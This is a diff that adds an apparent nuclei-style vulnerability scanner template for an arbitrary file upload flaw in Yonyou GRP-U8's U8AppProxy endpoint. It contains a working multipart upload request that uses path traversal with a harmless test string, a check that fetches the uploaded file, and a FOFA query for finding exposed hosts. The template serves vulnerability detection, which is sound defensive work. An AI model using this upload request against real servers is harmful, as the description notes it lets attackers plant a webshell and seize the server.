@@ -1,0 +1,48 @@
+id: 用友GRP-U8 软件 U8AppProxy 任意文件上传漏洞
+time: '2023-06-08'
+
+
+info:
+  name: 用友GRP-U8 软件 U8AppProxy 任意文件上传漏洞
+  severity: high
+  description: 用友GRP-U8管理软件 U8AppProxy 存在任意文件上传漏洞，攻击者可上传webshell获取服务器权限。
+  reference: https://blog.csdn.net/m0_46699477/article/details/131113904
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body=“window.location.replace(“login.jsp?up=1”)” || body=“GRP-U8”
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hiworrd"
+      - "{{BaseURL}}/hiworrd.txt"
+    
+    Rheader:
+      - Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 & Accept-Encoding:gzip, deflate & DNT:1 & Cookie:JSESSIONID=635F2271089E7A7E66F3F84824553DEE & Upgrade-Insecure-Requests:1 & Content-Type:multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+        
+    body: 
+      - |
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        Content-Type: image/png
+
+        hiword!!!
+        --59229605f98b8cf290a7b8908b34616b-
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "hiword!!!"
+
+      - type: status
+        status:
+          - 200
+    
